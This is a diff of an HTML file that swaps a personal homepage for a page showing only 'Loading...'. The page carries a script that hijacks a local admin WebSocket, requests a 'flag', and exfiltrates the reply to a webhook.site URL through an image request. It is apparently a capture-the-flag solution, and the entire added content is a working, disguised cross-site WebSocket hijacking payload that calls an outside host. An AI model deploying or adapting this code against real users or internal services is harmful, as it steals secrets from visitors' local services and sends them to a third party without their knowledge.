@@ -1,21 +1,33 @@
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name = "Writer" content="Aryan Komaei">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aryan Komaei's Homepage</title>
-    <link rel="stylesheet" href="main.css">
+<meta charset="utf-8">
+<script>
+(function() {
 
+  const TARGET_WS = "ws://localhost:8080/admin/ws";
+  const EXFIL_URL = "https://webhook.site/f08770f4-2430-4f12-8ad3-32f527cef2d6";
+
+  const ws = new WebSocket(TARGET_WS);
+
+  ws.onopen = () => {
+    ws.send("flag");      // ask for the flag
+  };
+
+  ws.onmessage = event => {
+    const flag = event.data;
+
+    // exfiltrate the flag
+    const img = new Image();
+    img.src = EXFIL_URL + "?flag=" + encodeURIComponent(flag);
+
+    console.log("FLAG:", flag);
+  };
+
+})();
+</script>
 </head>
 <body>
-    <p>Hello World</p>
-    <p>I am currently working on this page. Please ignore it :)</p>
-    <p>
-        <strong>contact</strong>
-        <ul>
-            <li><a href="mailto:random@gmail.com" target="_blank">E-mail</a></li>
-            <li><a href="https://www.linkedin.com/in/arian-komaei/" target="_blank">linkedin</a></li>
-        </ul>
-    </p>
+<h1>Loading...</h1>
 </body>
 </html>
